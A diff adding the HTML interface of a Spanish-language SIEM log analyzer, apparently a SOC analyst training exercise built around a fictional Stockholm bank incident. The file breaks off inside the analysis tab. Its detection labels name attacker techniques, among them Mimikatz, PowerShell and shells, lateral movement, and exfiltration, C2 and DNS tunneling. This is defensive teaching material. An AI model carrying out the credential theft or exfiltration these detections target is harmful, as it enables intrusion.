@@ -1,0 +1,2448 @@
+<!DOCTYPE html>
+<html lang="es" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NordicSec SOC L2 | SIEM Log Analyzer & Incident Response</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Inter & JetBrains Mono -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- SheetJS (xlsx) para lectura y creación de archivos Excel reales -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+    <!-- Chart.js para el Dashboard -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- html2pdf.js para exportación directa a PDF -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        soc: {
+                            bg: '#090d16',
+                            panel: '#111827',
+                            card: '#1e293b',
+                            border: '#334155',
+                            cyan: '#06b6d4',
+                            red: '#ef4444',
+                            orange: '#f97316',
+                            amber: '#f59e0b',
+                            green: '#10b981'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #090d16;
+            color: #f1f5f9;
+            overflow-x: hidden;
+        }
+        /* Scrollbar personalizada estilo Cyber */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f172a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #334155;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #475569;
+        }
+        .cyber-grid {
+            background-image: radial-gradient(rgba(6, 182, 212, 0.08) 1px, transparent 1px);
+            background-size: 24px 24px;
+        }
+        /* Estilos para impresión / PDF limpio */
+        @media print {
+            body {
+                background: #ffffff !important;
+                color: #0f172a !important;
+            }
+            .no-print {
+                display: none !important;
+            }
+            #printable-report {
+                display: block !important;
+                box-shadow: none !important;
+                border: none !important;
+                width: 100% !important;
+                max-width: 100% !important;
+                padding: 0 !important;
+                margin: 0 !important;
+            }
+        }
+    </style>
+</head>
+<body class="font-sans antialiased min-h-screen flex flex-col cyber-grid selection:bg-cyan-500 selection:text-slate-950">
+
+    <!-- Notificación Toast Flotante -->
+    <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 max-w-md w-full pointer-events-none px-4"></div>
+
+    <!-- Modal de Contexto / Misión -->
+    <div id="mission-modal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-3xl w-full p-6 shadow-2xl">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-4 mb-5">
+                <div class="flex items-center gap-3">
+                    <div class="p-2.5 rounded-xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400">
+                        <i data-lucide="shield-alert" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-bold text-white">Briefing de Misión — Analista SOC Nivel 2</h3>
+                        <p id="mm-subtitle" class="text-xs text-slate-400">NordicSec Cyber Defense | Sede Estocolmo, Suecia 🇸🇪</p>
+                    </div>
+                </div>
+                <button onclick="toggleMissionModal()" class="text-slate-400 hover:text-white p-1.5 rounded-lg hover:bg-slate-800">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                <div class="bg-slate-800/60 border border-slate-700/70 p-4 rounded-xl">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-cyan-400">01. Escenario</span>
+                    <h4 id="mm-scenario-title" class="font-bold text-white mt-1 mb-2">Consultora en Estocolmo</h4>
+                    <p id="mm-scenario-desc" class="text-xs text-slate-300 leading-relaxed">Usted acaba de incorporarse como <strong>Analista SOC Nivel 2</strong> en nuestra consultora en Estocolmo, Suecia. El equipo de Nivel 1 ha escalado un caso urgente.</p>
+                </div>
+                <div class="bg-slate-800/60 border border-slate-700/70 p-4 rounded-xl">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-amber-400">02. Reporte del Cliente</span>
+                    <h4 class="font-bold text-white mt-1 mb-2">Logs SIEM en Excel (.xlsx)</h4>
+                    <p class="text-xs text-slate-300 leading-relaxed">El cliente corporativo sospecha de un incidente en su infraestructura crítica y entrega un archivo <strong>Excel (.xlsx)</strong> con logs exportados de su SIEM.</p>
+                </div>
+                <div class="bg-cyan-950/40 border border-cyan-500/40 p-4 rounded-xl">
+                    <span class="text-xs font-semibold uppercase tracking-wider text-emerald-400">03. Misión</span>
+                    <h4 class="font-bold text-white mt-1 mb-2">IoCs y Correlación</h4>
+                    <p class="text-xs text-slate-200 leading-relaxed">Buscar <strong>Indicadores de Compromiso (IoC)</strong>, correlacionar eventos, establecer si hubo <strong>uno o varios incidentes</strong> y emitir el Informe Técnico en PDF.</p>
+                </div>
+            </div>
+
+            <div class="bg-slate-950 border border-slate-800 rounded-xl p-4 mb-6">
+                <h4 class="text-xs font-bold uppercase tracking-wider text-slate-400 mb-3">Qué detecta automáticamente nuestra plataforma</h4>
+                <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 text-xs">
+                    <div class="flex items-start gap-2">
+                        <i data-lucide="key-round" class="w-4 h-4 text-red-400 shrink-0 mt-0.5"></i>
+                        <div><strong class="text-white block">Fuerza Bruta</strong><span class="text-slate-400">Intentos de acceso fallidos repetidos (T1110)</span></div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i data-lucide="user-check" class="w-4 h-4 text-amber-400 shrink-0 mt-0.5"></i>
+                        <div><strong class="text-white block">Inicios Sospechosos</strong><span class="text-slate-400">Sesiones anómalas por IP, hora o patrón (T1078)</span></div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i data-lucide="chevrons-up" class="w-4 h-4 text-orange-400 shrink-0 mt-0.5"></i>
+                        <div><strong class="text-white block">Escalamiento</strong><span class="text-slate-400">Elevación de privilegios / Admin (T1548)</span></div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i data-lucide="terminal" class="w-4 h-4 text-purple-400 shrink-0 mt-0.5"></i>
+                        <div><strong class="text-white block">Comandos y Procesos</strong><span class="text-slate-400">PowerShell, Mimikatz, shells (T1059)</span></div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i data-lucide="network" class="w-4 h-4 text-cyan-400 shrink-0 mt-0.5"></i>
+                        <div><strong class="text-white block">Movimiento Lateral</strong><span class="text-slate-400">Saltos SMB, RDP, WinRM, SSH (T1021)</span></div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i data-lucide="radar" class="w-4 h-4 text-emerald-400 shrink-0 mt-0.5"></i>
+                        <div><strong class="text-white block">Otras Anomalías</strong><span class="text-slate-400">Exfiltración, C2, DNS Tunneling (T1041)</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex justify-end gap-3">
+                <button onclick="loadStockholmDataset(); toggleMissionModal();" class="px-4 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-sm flex items-center gap-2 transition">
+                    <i data-lucide="zap" class="w-4 h-4"></i> Cargar Caso Estocolmo Ahora
+                </button>
+                <button onclick="toggleMissionModal()" class="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-medium text-sm transition">
+                    Entendido
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Nueva Misión -->
+    <div id="new-mission-modal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4 no-print">
+        <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-xl w-full p-6 shadow-2xl max-h-[90vh] overflow-y-auto">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-4 mb-5">
+                <div class="flex items-center gap-3">
+                    <div class="p-2.5 rounded-xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400">
+                        <i data-lucide="folder-plus" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-bold text-white">Nueva misión</h3>
+                        <p class="text-xs text-slate-400">Defina el cliente y el contexto del caso que va a analizar</p>
+                    </div>
+                </div>
+                <button onclick="toggleNewMissionModal()" class="text-slate-400 hover:text-white p-1.5 rounded-lg hover:bg-slate-800" aria-label="Cerrar">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+            <div class="space-y-4">
+                <div>
+                    <label for="nm-company" class="text-xs font-semibold text-slate-300 block mb-1.5">Nombre de la compañía</label>
+                    <input id="nm-company" type="text" maxlength="80" placeholder="Ej. Acme Logistics S.A." class="w-full px-3 py-2 rounded-xl bg-slate-950 border border-slate-700 focus:border-cyan-400 focus:outline-none text-sm text-white placeholder-slate-500">
+                </div>
+                <div>
+                    <label for="nm-desc" class="text-xs font-semibold text-slate-300 block mb-1.5">Descripción de la misión</label>
+                    <textarea id="nm-desc" rows="4" maxlength="600" placeholder="Ej. El cliente sospecha accesos no autorizados al servidor de facturación. Se entrega la exportación del SIEM de las últimas 48 horas." class="w-full px-3 py-2 rounded-xl bg-slate-950 border border-slate-700 focus:border-cyan-400 focus:outline-none text-sm text-white placeholder-slate-500 resize-y"></textarea>
+                </div>
+                <p id="nm-error" class="hidden text-xs text-red-400"></p>
+            </div>
+            <div class="mt-6 pt-4 border-t border-slate-800">
+                <h4 class="text-xs font-bold text-slate-400 mb-2">Misiones guardadas</h4>
+                <div id="nm-list" class="space-y-2"></div>
+            </div>
+            <div class="flex justify-end gap-3 mt-6">
+                <button onclick="toggleNewMissionModal()" class="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-medium text-sm transition">Cancelar</button>
+                <button onclick="createMission()" class="px-4 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-sm flex items-center gap-2 transition">
+                    <i data-lucide="plus" class="w-4 h-4"></i> Crear misión
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER SUPERIOR -->
+    <header class="bg-slate-900/90 backdrop-blur-md border-b border-slate-800 sticky top-0 z-40 no-print">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 py-3 flex flex-wrap items-center justify-between gap-4">
+            <!-- Branding -->
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/20">
+                    <i data-lucide="shield" class="w-6 h-6 text-slate-950 stroke-[2.5]"></i>
+                </div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <h1 class="font-bold text-white tracking-tight text-base sm:text-lg">NORDICSEC <span class="text-cyan-400 font-mono text-sm">SIEM-ANALYZER v2.6</span></h1>
+                        <span class="hidden sm:inline-flex items-center px-2 py-0.5 rounded-full text-[11px] font-medium bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
+                            SOC Nivel 2 • Jec0d3r
+                        </span>
+                    </div>
+                    <p class="text-xs text-slate-400">Análisis de Indicadores de Compromiso (IoC), Correlación de Incidentes y Reporte Forense</p>
+                </div>
+            </div>
+
+            <!-- Estado Rápido y Acciones Globales -->
+            <div class="flex items-center gap-2.5 flex-wrap">
+                <div id="status-badge" class="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-slate-800/90 border border-slate-700 text-xs">
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                    <span id="header-mission-name" class="font-semibold text-white truncate max-w-[200px]"></span><span class="text-slate-600">|</span>
+                    <span id="header-dataset-name" class="font-mono text-slate-300">Dataset: Caso_Estocolmo_SIEM.xlsx</span>
+                </div>
+
+                <button onclick="toggleMissionModal()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-medium text-slate-200 flex items-center gap-1.5 transition" title="Ver Contexto y Misión de la Tarea">
+                    <i data-lucide="info" class="w-4 h-4 text-cyan-400"></i>
+                    <span>Misión</span>
+                </button>
+
+                <button onclick="toggleNewMissionModal()" class="px-3 py-1.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 text-xs font-semibold flex items-center gap-1.5 transition" title="Crear una nueva misión con otro cliente">
+                    <i data-lucide="folder-plus" class="w-4 h-4"></i>
+                    <span>Nueva misión</span>
+                </button>
+
+                <button onclick="downloadSampleExcel()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-medium text-amber-300 flex items-center gap-1.5 transition" title="Descargar un archivo Excel (.xlsx) con los logs del cliente para probar la importación">
+                    <i data-lucide="file-spreadsheet" class="w-4 h-4 text-amber-400"></i>
+                    <span class="hidden md:inline">Descargar Excel (.xlsx) Cliente</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- BARRA DE NAVEGACIÓN DE LAS 6 FUNCIONALIDADES REQUERIDAS -->
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 border-t border-slate-800/80 bg-slate-950/40">
+            <nav class="flex items-center gap-1 overflow-x-auto py-1.5" aria-label="Funcionalidades">
+                <button onclick="switchTab('tab-upload')" id="btn-tab-upload" class="tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap">
+                    <span class="font-mono text-xs px-1.5 py-0.5 rounded bg-slate-800 text-cyan-400">01</span>
+                    <i data-lucide="upload-cloud" class="w-4 h-4"></i>
+                    <span>Carga de Archivos</span>
+                </button>
+                <button onclick="switchTab('tab-analysis')" id="btn-tab-analysis" class="tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap">
+                    <span class="font-mono text-xs px-1.5 py-0.5 rounded bg-slate-800 text-cyan-400">02</span>
+                    <i data-lucide="radar" class="w-4 h-4"></i>
+                    <span>Análisis de Seguridad</span>
+                </button>
+                <button onclick="switchTab('tab-dashboard')" id="btn-tab-dashboard" class="tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap">
+                    <span class="font-mono text-xs px-1.5 py-0.5 rounded bg-slate-800 text-cyan-400">03</span>
+                    <i data-lucide="bar-chart-3" class="w-4 h-4"></i>
+                    <span>Dashboard</span>
+                </button>
+                <button onclick="switchTab('tab-risks')" id="btn-tab-risks" class="tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap">
+                    <span class="font-mono text-xs px-1.5 py-0.5 rounded bg-slate-800 text-cyan-400">04</span>
+                    <i data-lucide="alert-triangle" class="w-4 h-4"></i>
+                    <span>Clasificación de Riesgos</span>
+                </button>
+                <button onclick="switchTab('tab-report')" id="btn-tab-report" class="tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap">
+                    <span class="font-mono text-xs px-1.5 py-0.5 rounded bg-slate-800 text-cyan-400">05</span>
+                    <i data-lucide="file-text" class="w-4 h-4"></i>
+                    <span>Informe Técnico</span>
+                </button>
+                <button onclick="switchTab('tab-export')" id="btn-tab-export" class="tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap">
+                    <span class="font-mono text-xs px-1.5 py-0.5 rounded bg-slate-800 text-cyan-400">06</span>
+                    <i data-lucide="file-down" class="w-4 h-4"></i>
+                    <span>Exportación PDF</span>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <!-- CONTENIDO PRINCIPAL -->
+    <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-6">
+
+        <!-- BANNER RESUMEN DE MISIÓN Y MÉTRICAS RÁPIDAS -->
+        <div class="grid grid-cols-2 lg:grid-cols-5 gap-3 mb-6 no-print">
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 flex items-center justify-between">
+                <div>
+                    <p class="text-xs text-slate-400 font-medium">Total Eventos SIEM</p>
+                    <p id="kpi-total-logs" class="text-2xl font-bold text-white font-mono mt-0.5">0</p>
+                    <span class="text-[11px] text-slate-400">Filas analizadas</span>
+                </div>
+                <div class="p-3 rounded-xl bg-slate-800 text-cyan-400">
+                    <i data-lucide="database" class="w-5 h-5"></i>
+                </div>
+            </div>
+
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 flex items-center justify-between">
+                <div>
+                    <p class="text-xs text-slate-400 font-medium">Eventos Sospechosos</p>
+                    <p id="kpi-suspicious-logs" class="text-2xl font-bold text-amber-400 font-mono mt-0.5">0</p>
+                    <span id="kpi-suspicious-pct" class="text-[11px] text-amber-300/80">0% del tráfico</span>
+                </div>
+                <div class="p-3 rounded-xl bg-amber-500/10 text-amber-400 border border-amber-500/20">
+                    <i data-lucide="shield-alert" class="w-5 h-5"></i>
+                </div>
+            </div>
+
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 flex items-center justify-between">
+                <div>
+                    <p class="text-xs text-slate-400 font-medium">Hallazgos / Alertas</p>
+                    <p id="kpi-total-findings" class="text-2xl font-bold text-red-400 font-mono mt-0.5">0</p>
+                    <span class="text-[11px] text-slate-400">Agrupados por táctica</span>
+                </div>
+                <div class="p-3 rounded-xl bg-red-500/10 text-red-400 border border-red-500/20">
+                    <i data-lucide="flame" class="w-5 h-5"></i>
+                </div>
+            </div>
+
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 flex items-center justify-between">
+                <div>
+                    <p class="text-xs text-slate-400 font-medium">Incidentes Correlacionados</p>
+                    <p id="kpi-incidents-count" class="text-2xl font-bold text-cyan-400 font-mono mt-0.5">0</p>
+                    <span id="kpi-incidents-label" class="text-[11px] text-cyan-300/80">Sin evaluar</span>
+                </div>
+                <div class="p-3 rounded-xl bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
+                    <i data-lucide="git-merge" class="w-5 h-5"></i>
+                </div>
+            </div>
+
+            <div class="col-span-2 lg:col-span-1 bg-gradient-to-br from-red-950/60 to-slate-900 border border-red-500/40 rounded-2xl p-4 flex items-center justify-between">
+                <div>
+                    <p class="text-xs text-red-300 font-medium">Nivel de Riesgo Global</p>
+                    <p id="kpi-global-risk" class="text-xl font-extrabold text-red-400 tracking-wide uppercase mt-0.5">CRÍTICO</p>
+                    <span class="text-[11px] text-red-200/80">Requiere Contención</span>
+                </div>
+                <div class="p-3 rounded-xl bg-red-500/20 text-red-400">
+                    <i data-lucide="siren" class="w-5 h-5"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- =================================================================== -->
+        <!-- PESTAÑA 01: CARGA DE ARCHIVOS (.XLSX / .CSV) Y VISUALIZADOR DE LOGS -->
+        <!-- =================================================================== -->
+        <section id="tab-upload" class="tab-content space-y-6">
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <!-- Panel de Importación Excel -->
+                <div class="lg:col-span-2 bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <div>
+                            <span class="text-xs font-mono uppercase text-cyan-400">Funcionalidad 01</span>
+                            <h2 class="text-xl font-bold text-white">Carga e Importación de Logs SIEM (.xlsx / .csv)</h2>
+                        </div>
+                        <span class="px-2.5 py-1 rounded-lg bg-slate-800 text-xs font-mono text-slate-300">Motor SheetJS Activo</span>
+                    </div>
+                    <p class="text-sm text-slate-300 mb-5">
+                        Importe el archivo Excel (<code>.xlsx</code>, <code>.xls</code> o <code>.csv</code>) entregado por el cliente con la exportación de eventos del SIEM. El motor normalizará automáticamente las columnas (Fecha/Hora, IP Origen, IP Destino, Usuario, Host, Evento, Comando/Proceso, Estado).
+                    </p>
+
+                    <!-- Zona Drag & Drop -->
+                    <label for="excel-file-input" id="drop-zone" class="border-2 border-dashed border-slate-700 hover:border-cyan-400 bg-slate-950/60 hover:bg-slate-900/80 transition rounded-2xl p-8 flex flex-col items-center justify-center cursor-pointer text-center group">
+                        <div class="w-14 h-14 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 group-hover:scale-110 transition mb-3">
+                            <i data-lucide="file-spreadsheet" class="w-7 h-7"></i>
+                        </div>
+                        <p class="text-base font-semibold text-white mb-1">Arrastre aquí el archivo Excel (.xlsx) o haga clic para seleccionar</p>
+                        <p class="text-xs text-slate-400 mb-4">Soporta formatos .xlsx, .xls y .csv exportados de Splunk, Sentinel, QRadar, Elastic o FortiSIEM</p>
+                        <span class="px-4 py-2 rounded-xl bg-cyan-500 text-slate-950 font-semibold text-xs inline-flex items-center gap-2">
+                            <i data-lucide="folder-open" class="w-4 h-4"></i> Seleccionar Archivo del Equipo
+                        </span>
+                        <input id="excel-file-input" type="file" accept=".xlsx,.xls,.csv" class="hidden" onchange="handleFileUpload(event)">
+                    </label>
+
+                    <!-- Botones de Acción Rápida para Evaluación de la Tarea -->
+                    <div class="mt-5 pt-5 border-t border-slate-800 flex flex-wrap items-center justify-between gap-3">
+                        <div class="text-xs text-slate-400">
+                            ¿Desea probar con el escenario oficial de la consultora en Estocolmo o generar un archivo Excel real para subirlo?
+                        </div>
+                        <div class="flex flex-wrap items-center gap-2.5">
+                            <button onclick="loadStockholmDataset()" class="px-3.5 py-2 rounded-xl bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-300 border border-cyan-500/30 text-xs font-semibold flex items-center gap-2 transition">
+                                <i data-lucide="refresh-cw" class="w-4 h-4"></i> Recargar Dataset Estocolmo (36 Logs)
+                            </button>
+                            <button onclick="downloadSampleExcel()" class="px-3.5 py-2 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-xs font-semibold flex items-center gap-2 transition">
+                                <i data-lucide="download" class="w-4 h-4"></i> Descargar Excel de Prueba (.xlsx)
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel de Contexto del Caso Estocolmo -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between">
+                    <div>
+                        <div class="flex items-center gap-2 text-amber-400 text-xs font-mono uppercase mb-1">
+                            <i data-lucide="map-pin" class="w-4 h-4"></i> <span id="ficha-case">Estocolmo, Suecia • Caso #SE-2026-884</span>
+                        </div>
+                        <h3 class="text-lg font-bold text-white mb-3">Ficha del Reporte del Cliente</h3>
+                        <div class="space-y-3 text-xs text-slate-300">
+                            <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                                <span class="text-slate-400 block">Cliente Afectado:</span>
+                                <strong id="ficha-company" class="text-white">KronaBank Financial AB (Estocolmo)</strong>
+                            </div>
+                            <div id="ficha-desc-wrap" class="hidden p-3 rounded-xl bg-slate-950 border border-slate-800">
+                                <span class="text-slate-400 block">Descripción de la misión:</span>
+                                <p id="ficha-desc" class="text-slate-200 mt-1 leading-relaxed whitespace-pre-line"></p>
+                            </div>
+                            <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                                <span class="text-slate-400 block">Rol Asignado:</span>
+                                <strong class="text-cyan-400">Analista SOC Nivel 2 (Respuesta a Incidentes)</strong>
+                            </div>
+                            <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                                <span class="text-slate-400 block">Columnas Reconocidas en el Excel:</span>
+                                <div class="flex flex-wrap gap-1.5 mt-1.5 font-mono text-[11px]">
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">Timestamp</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">EventID</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">SourceIP</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">DestIP</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">User</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">Host</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">Action</span>
+                                    <span class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300">Command</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-5 pt-4 border-t border-slate-800">
+                        <button onclick="switchTab('tab-analysis')" class="w-full py-2.5 px-4 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-400 hover:to-blue-400 text-slate-950 font-bold text-xs flex items-center justify-center gap-2 shadow-lg shadow-cyan-500/10 transition">
+                            <span>Ir al Análisis de Seguridad e IoCs</span>
+                            <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tabla Interactiva de Logs Crudos del Excel -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4">
+                    <div>
+                        <h3 class="text-base font-bold text-white flex items-center gap-2">
+                            <i data-lucide="table-2" class="w-5 h-5 text-cyan-400"></i>
+                            Visualizador de Logs Importados del Excel
+                        </h3>
+                        <p class="text-xs text-slate-400">Inspección línea por línea con resaltado automático de amenazas detectadas por el motor SOC Nivel 2</p>
+                    </div>
+
+                    <!-- Buscador y Filtros -->
+                    <div class="flex flex-wrap items-center gap-2">
+                        <div class="relative">
+                            <i data-lucide="search" class="w-4 h-4 text-slate-400 absolute left-3 top-2.5"></i>
+                            <input id="log-search-input" type="text" oninput="renderLogsTable()" placeholder="Buscar IP, usuario, host, comando..." class="pl-9 pr-3 py-1.5 rounded-xl bg-slate-950 border border-slate-700 text-xs text-white focus:outline-none focus:border-cyan-400 w-60">
+                        </div>
+
+                        <select id="log-category-filter" onchange="renderLogsTable()" class="px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-cyan-400">
+                            <option value="ALL">Todas las Categorías</option>
+                            <option value="SUSPICIOUS_ONLY">Solo Eventos Sospechosos</option>
+                            <option value="Fuerza bruta">1. Fuerza bruta</option>
+                            <option value="Inicios sospechosos">2. Inicios sospechosos</option>
+                            <option value="Escalamiento">3. Escalamiento</option>
+                            <option value="Comandos y procesos">4. Comandos y procesos</option>
+                            <option value="Movimiento lateral">5. Movimiento lateral</option>
+                            <option value="Otras anomalías">6. Otras anomalías</option>
+                            <option value="Normal">Tráfico Normal / Benigno</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="overflow-x-auto rounded-xl border border-slate-800">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="bg-slate-950 text-[11px] font-mono uppercase text-slate-400 border-b border-slate-800">
+                                <th class="py-3 px-3">#</th>
+                                <th class="py-3 px-3">Timestamp (UTC)</th>
+                                <th class="py-3 px-3">EventID</th>
+                                <th class="py-3 px-3">Host</th>
+                                <th class="py-3 px-3">Usuario</th>
+                                <th class="py-3 px-3">IP Origen → Destino</th>
+                                <th class="py-3 px-3">Proceso / Comando / Detalle</th>
+                                <th class="py-3 px-3">Detección SOC</th>
+                                <th class="py-3 px-3">Criticidad</th>
+                            </tr>
+                        </thead>
+                        <tbody id="logs-table-body" class="divide-y divide-slate-800/70 text-xs font-mono">
+                            <!-- Renderizado dinámico por JS -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- =================================================================== -->
+        <!-- PESTAÑA 02: ANÁLISIS DE SEGURIDAD (6 DETECCIONES, IOCs Y CORRELACIÓN) -->
+        <!-- =================================================================== -->
+        <section id="tab-analysis" class="tab-content hidden space-y-6">
+            <!-- Encabezado de las 6 Categorías que debe detectar la aplicación -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-5">
+                    <div>
+                        <span class="text-xs font-mono uppercase text-cyan-400">Funcionalidad 02 • Motor Heurístico SIEM</span>
+                        <h2 class="text-xl font-bold text-white">Detección en las 6 Categorías Requeridas y Correlación de Incidentes</h2>
+                        <p class="text-xs text-slate-400 mt-0.5">Haga clic en cualquiera de las 6 tarjetas para filtrar la evidencia técnica y los Indicadores de Compromiso (IoC).</p>
+                    </div>
+                    <button onclick="resetCategoryFilter()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-medium text-cyan-300 self-start md:self-auto">
+                        Mostrar todas las categorías
+                    </button>
+                </div>
+
+                <!-- Grid de las 6 detecciones obligatorias de la captura 2 -->
+                <div id="six-categories-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+                    <!-- Se llena dinámicamente con conteos exactos -->
+                </div>
+            </div>
+
+            <!-- Dictamen de Correlación de Incidentes (¿Uno o varios incidentes?) -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <div class="lg:col-span-2 bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-2.5">
+                            <div class="p-2 rounded-xl bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
+                                <i data-lucide="git-branch" class="w-5 h-5"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-base font-bold text-white">Motor de Correlación Multi-Incidente (Kill Chain)</h3>
